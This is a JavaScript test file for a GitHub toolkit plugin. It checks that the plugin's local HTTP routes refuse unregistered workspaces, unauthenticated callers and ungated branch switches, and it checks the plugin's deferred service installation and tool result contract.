      end: (text) => { body = JSON.parse(text) },
    }
    await branchRoute(routes).handler({ method, url }, res)
    return { status, body }
  }

  // A registered workspace resolves, and the branch comes back.
  const ok = await respond('/dsh-github-toolkit/branch?path=' + encodeURIComponent('D:\\work\\registered'))
  assert.equal(ok.status, 200)
  assert.deepEqual(ok.body, { ok: true, path: 'D:\\work\\registered', branch: 'feat/pill', detached: false, pr: null })
  assert.deepEqual(calls.git[0], ['rev-parse', '--abbrev-ref', 'HEAD'])

  // An UNREGISTERED path must be refused without running git at all.
  calls.git.length = 0
  const refused = await respond('/dsh-github-toolkit/branch?path=' + encodeURIComponent('C:\\Windows'))
  assert.equal(refused.body.ok, false)
  assert.equal(refused.body.error, 'unknown-workspace')
  assert.equal(calls.git.length, 0, 'no command may run for an unregistered path')

  // A missing/empty path is the same refusal, not a default directory.
  for (const query of ['', '?path=', '?path=%20']) {
    const empty = await respond(`/dsh-github-toolkit/branch${query}`)
    assert.equal(empty.body.ok, false, `query ${JSON.stringify(query)} must be refused`)
  }
  assert.equal(calls.git.length, 0)

  // Only GET and HEAD are served.
  const wrongMethod = await respond('/dsh-github-toolkit/branch?path=x', 'POST')
  assert.equal(wrongMethod.status, 405)
  assert.equal(calls.git.length, 0)
})

test('client bridge: a detached HEAD is reported as a state, not as a branch', async () => {
  // `git rev-parse --abbrev-ref HEAD` prints the literal "HEAD" when detached.
  // Sending that to the pill would render "HEAD" as if it were a branch name.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const { ctx } = makeContext({
    services: {
      webServer: { register: (route) => { routes.push(route); return () => {} } },
      workspaceRegistry: { resolveByPath: async (path) => ({ path }) },
    },
  })
  const { runner } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'HEAD\n', stderr: '', truncated: false, spillPath: '' }),
  })
  installClientBridge(ctx, { runner, logger: ctx.logger, webServer: ctx.get('webServer'), registry: ctx.get('workspaceRegistry') })

  /** @type {any} */
  let body
  await branchRoute(routes).handler({ method: 'GET', url: '/dsh-github-toolkit/branch?path=/w' }, {
    setHeader: () => {}, statusCode: 200, end: (text) => { body = JSON.parse(text) },
  })
  assert.deepEqual(body, { ok: true, path: '/w', branch: '', detached: true, pr: null })
})

test('client bridge: the route waits for webServer by LISTENING, not by declaring it', async () => {
  // Three approaches were tried against the real Desktop composition; two failed:
  //
  // 1. `ctx.get('webServer')` once in `apply` — undefined at that moment, so the
  //    route silently never registered and the pill showed an idle dash.
  // 2. `ctx.inject(['webServer'], cb)` — the callback did not register it either.
  // 3. A second plugin ROW declaring `webServer` — right in principle, but a
  //    profile bundle's row may not use a bare SUBPATH: the launcher supplies a
  //    profile package by its exact name, so `dsh-github-toolkit/web` resolved
  //    nowhere and the row reported "failed to import".
  //
  // Cordis emits `internal/service` for every service registration, so the route
  // installs when the service is already up and on every later one. That keeps
  // `webServer` optional: the row's `inject` stays `['tools']`.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const webServer = { register: (route) => { routes.push(route); return () => {} } }

  // A webServer that is already composed registers immediately.
  const ready = makeContext({ services: { webServer } })
  installClientBridge(ready.ctx, { runner: makeRunner().runner, logger: ready.ctx.logger })
  assert.equal(routes.length, 4, 'a webServer that is already up registers every route immediately')
  for (const route of routes) {
    assert.equal(route.kind, 'exact')
    assert.match(route.path, /^\/dsh-github-toolkit\//)
  }

  // A webServer that arrives later is caught by the listener.
  const heard = makeContext({ services: {} })
  const holder = { value: undefined }
  let installed = 0
  const ctx2 = { ...heard.ctx, get: (name) => (name === 'webServer' ? holder.value : undefined) }
  installClientBridge(ctx2, { runner: makeRunner().runner, logger: heard.ctx.logger })

  const listeners = heard.listeners.get('internal/service') ?? []
  assert.equal(listeners.length, 1, 'it must listen for service registrations')
  assert.equal(installed, 0, 'nothing to register before webServer exists')

  holder.value = { register: () => { installed += 1; return () => {} } }
  for (const listener of listeners) listener('somethingElse')
  assert.equal(installed, 0, 'an unrelated service must not trigger registration')
  for (const listener of listeners) listener('webServer')
  assert.equal(installed, 4, 'the webServer announcement registers every route')
  for (const listener of listeners) listener('webServer')
  assert.equal(installed, 4, 'a repeat announcement must not double-register (a duplicate throws by contract)')
})

test('client bridge: the TOOLS row never depends on the browser carrier', async () => {
  // The split exists for this property alone: a headless profile has no
  // `webServer`, and `webServer` must therefore never appear in the tools row's
  // `inject` — that is a hard dependency, and the plugin would then never
  // activate there, taking all eight github_* tools with it.
  const entry = await import('../index.js')
  assert.deepEqual(entry.inject, ['tools'], 'the tools row declares only tools')
  assert.ok(!(entry.inject ?? []).includes('webServer'))

  // And in a composition with no browser carrier, the tools still register.
  const { ctx, tools } = makeContext({ services: {} })
  entry.apply(ctx, {})
  assert.equal(tools.size, 8, 'every tool registers without a webServer')
})

test('client bridge: the route is owned by an EFFECT, so disposal releases it', async () => {
  // MEASURED failure this pins: the first version registered the route and merely
  // held its disposer. Disposing the plugin's fiber therefore did NOT release the
  // route, so the next activation — the HMR path an install takes — failed with
  // `webserver: duplicate exact route "/dsh-github-toolkit/branch"` and the entry
  // did not activate. "Register every resource inside apply with ctx.effect or
  // ctx.on and return its cleanup" is the contract, and this is why.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {(() => void)[]} */
  const released = []
  /** @type {(() => void)[]} */
  const effects = []
  let registered = 0
  const webServer = {
    register: () => {
      registered += 1
      return () => released.push(() => {})
    },
  }
  const ctx = {
    logger: { info: () => {}, warn: () => {} },
    get: (name) => (name === 'webServer' ? webServer : undefined),
    effect: (fn) => {
      const disposer = fn()
      effects.push(typeof disposer === 'function' ? disposer : () => {})
      return () => {}
    },
    on: () => () => {},
  }
  assert.equal(installClientBridge(ctx, { runner: makeRunner().runner, logger: ctx.logger }), true)
  assert.equal(registered, 4, 'read, diagnostics, branch list, and switch')
  // Asserted as a PROPERTY, not as an effect count or an index: `installWhenAvailable`
  // adds a wrapper effect of its own (needed for installs that RETURN a disposer, such
  // as a prompt section), so pinning `effects[0]` would break on a refactor that
  // changed nothing about ownership. What must hold is that disposing the effects the
  // plugin created releases every route it registered.
  assert.ok(effects.length >= 2, `each route is owned by an effect (${effects.length} effects)`)
  for (const dispose of effects) dispose()
  assert.equal(released.length, 4, 'disposing the plugin effects must release every route')
})

test('client bridge: a webServer without register() is refused, not assumed', async () => {
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  const { runner } = makeRunner()
  const { ctx } = makeContext({ services: { webServer: {} } })
  assert.equal(installClientBridge(ctx, { runner, logger: ctx.logger }), false)
  const { ctx: none } = makeContext({ services: {} })
  assert.equal(installClientBridge(none, { runner, logger: none.logger }), false)
  // A context that cannot observe services at all is refused too, and says so.
  assert.equal(installClientBridge({ logger: { warn: () => {} } }, { runner }), false)
})

test('client bridge: the session form lets the browser name a session, never a directory', async () => {
  // This is the form the pill uses. A session id cannot point the route at an
  // arbitrary directory, so the browser has no way to ask about a path of its own
  // choosing — and the path that git runs in comes from the Host registry.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const { ctx } = makeContext({
    services: {
      webServer: { register: (route) => { routes.push(route); return () => {} } },
      // Deliberately NOT providing resolveByPath: the session form must not
      // depend on it.
      workspaceRegistry: {
        list: () => [
          { path: '/w/one', sessionIds: ['sess-a'] },
          { path: '/w/two', sessionIds: ['sess-b', 'sess-c'] },
        ],
      },
    },
  })
  const { runner, calls } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'main\n', stderr: '', truncated: false, spillPath: '' }),
  })
  installClientBridge(ctx, { runner, logger: ctx.logger, webServer: ctx.get('webServer'), registry: ctx.get('workspaceRegistry') })

  /** @type {any} */
  let body
  const ask = async (query) => {
    body = undefined
    await branchRoute(routes).handler({ method: 'GET', url: '/dsh-github-toolkit/branch' + query }, {
      setHeader: () => {}, statusCode: 200, end: (text) => { body = JSON.parse(text) },
    })
    return body
  }

  // The session resolves to its own workspace, and git runs THERE.
  const one = await ask('?sessionId=sess-b')
  assert.equal(one.ok, true)
  assert.equal(one.path, '/w/two')
  assert.equal(one.branch, 'main')

  // A session that belongs to no workspace is refused, and git never runs.
  calls.git.length = 0
  const unknown = await ask('?sessionId=sess-zzz')
  assert.equal(unknown.ok, false)
  assert.equal(unknown.error, 'unknown-workspace')
  assert.match(unknown.detail, /not attached to a registered workspace/)
  assert.equal(calls.git.length, 0)

  // An empty session id falls through to the path form, which is also refused
  // here because no path was given — never a default directory.
  const empty = await ask('?sessionId=')
  assert.equal(empty.ok, false)
  assert.equal(calls.git.length, 0)
})

test('client bridge: an unauthenticated request is refused, not served', async () => {
  // MEASURED on the running Desktop app: `/` answered 401 without the process
  // token, while this route answered 200 JSON to the same unauthenticated
  // request. A named route is public by default, so its owner has to opt into
  // Connection's check — `requestRejection` is documented as "apply Connection's
  // Host/Origin checks and browser authentication to another Web route".
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const webServer = { register: (route) => { routes.push(route); return () => {} } }
  const { ctx } = makeContext({
    services: {
      webServer,
      workspaceRegistry: { list: () => [{ path: '/w', sessionIds: ['sess-a'] }] },
      connection: { requestRejection: ({ headers }) => (headers?.['x-dsh-token'] === 'good' ? undefined : 401) },
    },
  })
  installClientBridge(ctx, { runner: makeRunner().runner, logger: ctx.logger })

  /** @type {{ status: number, body: string }} */
  let seen
  const ask = async (headers) => {
    seen = { status: 0, body: '' }
    const res = {
      setHeader: () => {},
      set statusCode(value) { seen.status = value },
      get statusCode() { return seen.status },
      end: (text) => { seen.body = String(text ?? '') },
    }
    await branchRoute(routes).handler({ method: 'GET', url: '/dsh-github-toolkit/branch?sessionId=sess-a', headers }, res)
    return seen
  }

  const refused = await ask({})
  assert.equal(refused.status, 401, 'an unauthenticated request must be refused')
  assert.match(refused.body, /authentication required/)
  assert.ok(!refused.body.includes('branch'), 'the refusal must not leak the payload')

  const served = await ask({ 'x-dsh-token': 'good' })
  assert.equal(served.status, 200)
  assert.match(served.body, /"ok":true/)

  // A composition with no Connection cannot judge requests; refusing everything
  // there would break the pill outright, so the route serves as before.
  const { ctx: bare } = makeContext({ services: { webServer: { register: () => () => {} } } })
  assert.doesNotThrow(() => installClientBridge(bare, { runner: makeRunner().runner, logger: bare.logger }))
})

test('client bridge: the pull request is reported, and its failure never costs the branch', async () => {
  // The PR is strictly best-effort: `gh` may be absent, unauthenticated, offline,
  // or the repository may have no remote. None of those is a reason to lose the
  // branch the pill was already showing, so the Host reports a missing PR as
  // `pr: null` rather than as a broken route.
  const { installClientBridge, BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  const okGit = () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: 'feat/pr\n', stderr: '', truncated: false, spillPath: '' })

  /** Build a route over one scripted gh answer and read its body. */
  const askWith = async (onGh) => {
    /** @type {any[]} */
    const routes = []
    const { ctx } = makeContext({
      services: {
        webServer: { register: (route) => { routes.push(route); return () => {} } },
        workspaceRegistry: { list: () => [{ path: '/w', sessionIds: ['sess-a'] }] },
      },
    })
    const { runner } = makeRunner({ onGit: okGit, onGh })
    installClientBridge(ctx, { runner, logger: ctx.logger })
    /** @type {any} */
    let body
    await branchRoute(routes).handler({ method: 'GET', url: '/dsh-github-toolkit/branch?sessionId=sess-a' }, {
      setHeader: () => {}, statusCode: 200, end: (text) => { body = JSON.parse(text) },
    })
    return body
  }

  // A pull request for the branch is projected down to the card facts.
  const withPr = await askWith(() => ({
    ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh',
    stdout: JSON.stringify([{ number: 14700, title: 'docs(gh-skill): document gh api pitfalls', state: 'OPEN', isDraft: false, reviewDecision: 'CHANGES_REQUESTED', url: 'https://github.com/cli/cli/pull/14700' }]),
    stderr: '', truncated: false, spillPath: '',
  }))
  assert.equal(withPr.branch, 'feat/pr')
  assert.deepEqual(withPr.pr, {
    number: 14700,
    title: 'docs(gh-skill): document gh api pitfalls',
    state: 'OPEN',
    isDraft: false,
    reviewDecision: 'CHANGES_REQUESTED',
    url: 'https://github.com/cli/cli/pull/14700',
  })

  // No PR for the branch: the branch still comes back.
  const noPr = await askWith(() => ({
    ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh',
    stdout: '[]', stderr: '', truncated: false, spillPath: '',
  }))
  assert.equal(noPr.branch, 'feat/pr')
  assert.equal(noPr.pr, null)

  // gh missing, failing, or answering garbage: same answer, branch intact.
  for (const onGh of [
    () => ({ ok: false, exitCode: -1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'failed to spawn gh: ENOENT', truncated: false, spillPath: '' }),
    () => ({ ok: false, exitCode: 1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'not logged in', truncated: false, spillPath: '' }),
    () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: 'not json at all', stderr: '', truncated: false, spillPath: '' }),
    () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '[{"title":"no number"}]', stderr: '', truncated: false, spillPath: '' }),
  ]) {
    const body = await askWith(onGh)
    assert.equal(body.ok, true, 'the route still succeeds')
    assert.equal(body.branch, 'feat/pr', 'the branch survives a broken PR lookup')
    assert.equal(body.pr, null)
  }

  // A detached HEAD has no branch, so no PR lookup is attempted at all.
  const detached = await askWith(() => { throw new Error('gh must not run without a branch') })
  assert.equal(detached.pr, null)
})

test('client bridge: the diagnostics route names what is present, and is gated', async () => {
  // This route exists because the plugin's logs go nowhere: an exhaustive scan of
  // DSH_HOME, %APPDATA%, %LOCALAPPDATA%, %TEMP% and the installation found no file
  // containing a single line of plugin output. Three diagnosis rounds were spent
  // inferring what this route now states outright.
  const { installClientBridge, DIAGNOSTICS_ROUTE: ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const { ctx } = makeContext({
    services: {
      webServer: { register: (route) => { routes.push(route); return () => {} } },
      workspaceRegistry: { list: () => [{ path: '/a' }, { path: '/b' }], resolveByPath: async () => undefined },
      connection: { requestRejection: ({ headers }) => (headers?.['x-dsh-token'] === 'good' ? undefined : 401) },
      jobs: {},
    },
  })
  installClientBridge(ctx, { runner: makeRunner().runner, logger: ctx.logger, version: '9.9.9' })

  const route = routes.find((r) => r.path === ROUTE)
  assert.ok(route, 'the diagnostics route is registered')

  /** @type {any} */
  let body
  const ask = async (headers) => {
    body = undefined
    await route.handler({ method: 'GET', url: ROUTE, headers }, {
      setHeader: () => {}, statusCode: 200, end: (text) => { body = text },
    })
    return body
  }

  // Ungated, it would describe the Host's composition to any local caller. The
  // refusal must carry the refusal and nothing else — no version, no service list.
  const refused = await ask({})
  assert.match(refused, /authentication required/)
  for (const leak of ['9.9.9', 'webServer', 'workspaceRegistry', 'connection', 'jobs', '{']) {
    assert.ok(!refused.includes(leak), `the refusal must not mention "${leak}": ${refused}`)
  }

  const report = JSON.parse(await ask({ 'x-dsh-token': 'good' }))
  assert.equal(report.ok, true)
  assert.equal(report.plugin, 'dsh-github-toolkit')
  assert.equal(report.version, '9.9.9', 'the RUNNING generation reports its version')
  assert.deepEqual(report.services, {
    webServer: true, workspaceRegistry: true, connection: true, jobs: true,
  })
  assert.equal(report.workspaces, 2)
  assert.equal(report.workspaceRegistryResolveByPath, true)
  assert.deepEqual(report.routes.slice().sort(), [BRANCH_ROUTE, BRANCHES_ROUTE, DIAGNOSTICS_ROUTE, SWITCH_ROUTE].slice().sort())
  // The guidance layer has no surface of its own, so what it OFFERED is reported here.
  // The field is named for what it measures and carries a caveat, because a list produced
  // by this provider is not proof that those skills won the catalog.
  assert.equal(report.guidance.promptSection, null)
  assert.deepEqual(report.guidance.offeredByThisProvider, [])
  assert.equal(report.guidance.offeredIsNotCatalogState, true)
  assert.match(report.guidance.note, /NOT proof/)
})

test('client bridge: the diagnostics route reports the guidance state it was given', async () => {
  const { installClientBridge, DIAGNOSTICS_ROUTE: ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const { ctx } = makeContext({
    services: { webServer: { register: (route) => { routes.push(route); return () => {} } } },
  })
  // A state object that reports half-installed guidance: the prompt section landed,
  // the skills did not. That is a real outcome — the two services are independent —
  // and the route must be able to show it rather than collapsing it to one boolean.
  installClientBridge(ctx, {
    runner: makeRunner().runner,
    logger: ctx.logger,
    guidance: { promptSection: true, sectionName: 'TOOL_GITHUB @ 3200', skills: ['github-pr-review'] },
  })
  /** @type {any} */
  let report
  await routes.find((r) => r.path === ROUTE).handler({ method: 'GET', url: ROUTE, headers: {} }, {
    setHeader: () => {}, statusCode: 200, end: (text) => { report = JSON.parse(text) },
  })
  assert.equal(report.guidance.promptSection, 'TOOL_GITHUB @ 3200')
  assert.deepEqual(report.guidance.offeredByThisProvider, ['github-pr-review'])
  // The caveat must travel WITH the number, not live only in a source comment: a reader
  // of this payload has no access to the source, and the field used to imply that a
  // non-empty list meant the catalog had accepted those skills.
  assert.equal(report.guidance.offeredIsNotCatalogState, true)
})

test('deferred: installWhenAvailable waits, retries, and never swallows a failure', async () => {
  // This mechanism is shared by the branch routes and the guidance layer, so it gets
  // its own tests. Its failure modes are the expensive ones: `ctx.get` in `apply` was
  // too early, and `ctx.inject` never fired at all — both measured, both silent.
  const { installWhenAvailable } = await import('../lib/deferred.js')

  /** Build a context that records effects and can announce services. */
  const makeCtx = (services) => {
    const listeners = []
    const effects = []
    return {
      services,
      listeners,
      effects,
      logger: { info: () => {}, warn: () => {} },
      get: (name) => services[name],
      effect: (fn) => { const d = fn(); effects.push(typeof d === 'function' ? d : () => {}); return () => {} },
      on: (event, listener) => { if (event === 'internal/service') listeners.push(listener); return () => {} },
    }
  }

  // 1. Already present: installs now, reports true.
  {
    const ctx = makeCtx({ thing: { id: 1 } })
    let seen
    const already = installWhenAvailable(ctx, 'thing', (service) => { seen = service })
    assert.equal(already, true, 'an available service installs synchronously')
    assert.deepEqual(seen, { id: 1 })
  }

  // 2. Absent: reports false, installs when the announcement arrives.
  {
    const ctx = makeCtx({})
    let installed = 0
    const already = installWhenAvailable(ctx, 'thing', () => { installed += 1 })
    assert.equal(already, false, 'an absent service does not install yet')
    assert.equal(installed, 0)
    ctx.services.thing = { id: 2 }
    for (const listener of ctx.listeners) listener('other')
    assert.equal(installed, 0, 'an unrelated service must not trigger the install')
    for (const listener of ctx.listeners) listener('thing')
    assert.equal(installed, 1, 'the announcement installs it')
    for (const listener of ctx.listeners) listener('thing')
    assert.equal(installed, 1, 'a repeat announcement must not install twice')
  }

  // 3. A throwing install: reported once, does not propagate, stays retryable.
  {
    const ctx = makeCtx({ thing: { id: 3 } })
    let attempts = 0
    assert.doesNotThrow(() => {
      installWhenAvailable(ctx, 'thing', () => { attempts += 1; throw new Error('install exploded') })
    }, 'a throwing install must not take the plugin down')
    assert.equal(attempts, 1)
    // Retryable: `installed` is set only AFTER the effect is created, so a later
    // announcement tries again rather than silently disabling itself.
    for (const listener of ctx.listeners) listener('thing')
    assert.equal(attempts, 2, 'a failed install must remain retryable')
  }

  // 4. A context that cannot observe services is refused, not assumed.
  {
    assert.equal(installWhenAvailable({ logger: {} }, 'thing', () => {}), false)
    assert.equal(installWhenAvailable(undefined, 'thing', () => {}), false)
  }
})

test('result contract: every returned value carries all declared fields', async () => {
  // The value DSL cannot express `required` (tools/probe-define-tool.mjs proves
  // the compiler rejects it), so the result contract is pinned here instead —
  // on real return values from every path a tool can take. This is a stronger
  // guarantee than the schema keyword would have been.
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner()
  registerDomainTools(ctx, testConfig(), runner)

  /** @type {{ label: string, value: any }[]} */
  const observed = []

  // 1. A successful command result.
  observed.push({
    label: 'success',
    value: await call(tools.get('github_repo'), { action: 'view', repo: 'a/b' }),
  })
  // 2. A gate rejection (destructive without confirm).
  observed.push({
    label: 'gate rejection',
    value: await call(tools.get('github_repo'), { action: 'delete', repo: 'a/b' }),
  })
  // 3. A missing-required-parameter rejection.
  observed.push({
    label: 'missing parameter',
    value: await call(tools.get('github_issue'), { action: 'create', repo: 'a/b' }),
  })
  // 4. A repository-resolution rejection.
  const { runner: noRemote } = makeRunner({
    onGit: () => ({ ok: true, exitCode: 0, signal: '', timedOut: false, durationMs: 1, command: 'git', stdout: '', stderr: '', truncated: false, spillPath: '' }),
  })
  const { ctx: ctx4, tools: tools4 } = makeContext()
  registerDomainTools(ctx4, testConfig({ defaultRepo: '' }), noRemote)
  observed.push({
    label: 'no repository',
    value: await call(tools4.get('github_pr'), { action: 'view', number: 1 }),
  })
  // 5. The custom-executed github_api path.
  observed.push({
    label: 'github_api rejection',
    value: await call(tools.get('github_api'), { action: 'request', path: 'not-relative' }),
  })
  // 6. The custom-executed github_auth status path.
  observed.push({
    label: 'github_auth status',
    value: await call(tools.get('github_auth'), { action: 'status' }),
  })

  for (const { label, value } of observed) {
    assert.equal(typeof value, 'object', `${label}: result must be an object`)
    assert.notEqual(value, null, `${label}: result must not be null`)
    for (const key of RESULT_KEYS) {
      assert.ok(key in value, `${label}: result is missing "${key}"`)
    }
    assert.equal(typeof value.ok, 'boolean', `${label}: ok must be a boolean`)
    assert.equal(typeof value.exitCode, 'number', `${label}: exitCode must be a number`)
  }
  assert.deepEqual(Object.keys(RESULT_VALUE_SCHEMA.properties), [...RESULT_KEYS, 'data'])
})

test('result contract: declare-tool failures surface as rejections, not malformed values', async () => {
  // Throwing is correct for infrastructure failures per the tool-authoring
  // reference: the registry materializes the throw as an error result.
  const { ctx, tools } = makeContext()
  const { runner } = makeRunner({
    onGh: () => ({ ok: false, exitCode: -1, signal: '', timedOut: false, durationMs: 1, command: 'gh', stdout: '', stderr: 'failed to spawn gh: ENOENT', truncated: false, spillPath: '' }),
  })
  registerDomainTools(ctx, testConfig(), runner)
  await assert.rejects(() => call(tools.get('github_repo'), { action: 'view', repo: 'a/b' }))
})

test('client bridge: without a connection service the reads serve and the SWITCH is refused', async () => {
  // Found by an independent audit, which drove a real request through every route in a
  // composition with no `connection` service and measured that ALL FOUR served — including
  // /switch, which runs `git switch` on the user's working tree.
  //
  // The four routes do not carry the same consequence, so they are not treated alike. The
  // rule is "a missing service is not consent": an apparatus that cannot judge a request
  // must not read "cannot judge" as "judged safe", least of all for a request that changes
  // something belonging to someone else. The cost is asymmetric too — refusing the reads
  // breaks the pill entirely, while refusing the write leaves it showing the branch.
  const { installClientBridge, BRANCH_ROUTE, SWITCH_ROUTE } = await import('../lib/client-bridge.js')
  /** @type {any[]} */
  const routes = []
  const webServer = { register: (route) => { routes.push(route); return () => {} } }
  const { ctx } = makeContext({
    services: {
      webServer,
      workspaceRegistry: { list: () => [{ path: '/w', sessionIds: ['sess-a'] }] },
      // NO `connection`. The composition can serve HTTP but cannot judge a caller.
    },
  })
  installClientBridge(ctx, { runner: makeRunner().runner, logger: ctx.logger })

  /** Drive one request against a given route set and return what it answered. */
  const askIn = async (set, path, method) => {
    const route = set.find((r) => r.path === path)
    assert.ok(route, `${path} must be registered`)
    /** @type {{ status: number, body: string }} */
    const seen = { status: 0, body: '' }
    const res = {
      setHeader: () => {},
      set statusCode(value) { seen.status = value },
      get statusCode() { return seen.status },
      end: (text) => { seen.body = String(text ?? '') },
    }
    const request = {
      method,
      url: path === BRANCH_ROUTE ? `${path}?sessionId=sess-a` : path,
      headers: { 'content-type': 'application/json' },
      async *[Symbol.asyncIterator]() { yield Buffer.from(JSON.stringify({ sessionId: 'sess-a', branch: 'main' })) },
    }
    await route.handler(request, res)
    return seen
  }
  const ask = (path, method) => askIn(routes, path, method)

  const read = await ask(BRANCH_ROUTE, 'GET')
  assert.equal(read.status, 200, 'a READ route serves without the gate; refusing it would break the pill outright')

  const write = await ask(SWITCH_ROUTE, 'POST')
  assert.equal(write.status, 403, 'the SWITCH route is refused when nothing can vouch for the caller')
  assert.match(write.body, /authentication required/, 'the refusal says what is missing, not just a status')

  // And with a connection that admits, the same route works — otherwise the refusal above
  // could be satisfied by breaking /switch for everyone.
  //
  // Its own route array, on purpose: a second install into the SAME array would leave
  // `find(path === SWITCH_ROUTE)` returning the FIRST registration — the refusing one — so
  // this assertion would have been testing the previous composition and passing for the
  // wrong reason. That is what the first version of this test did.
  /** @type {any[]} */
  const routesWithConnection = []
  const admitting = makeContext({
    services: {
      webServer: { register: (route) => { routesWithConnection.push(route); return () => {} } },
      workspaceRegistry: { list: () => [{ path: '/w', sessionIds: ['sess-a'] }] },
      connection: { requestRejection: () => undefined },
    },
  })
  installClientBridge(admitting.ctx, { runner: makeRunner().runner, logger: admitting.ctx.logger })
  const allowed = await askIn(routesWithConnection, SWITCH_ROUTE, 'POST')
  assert.notEqual(allowed.status, 403, 'an admitting connection is not refused by the new rule')
})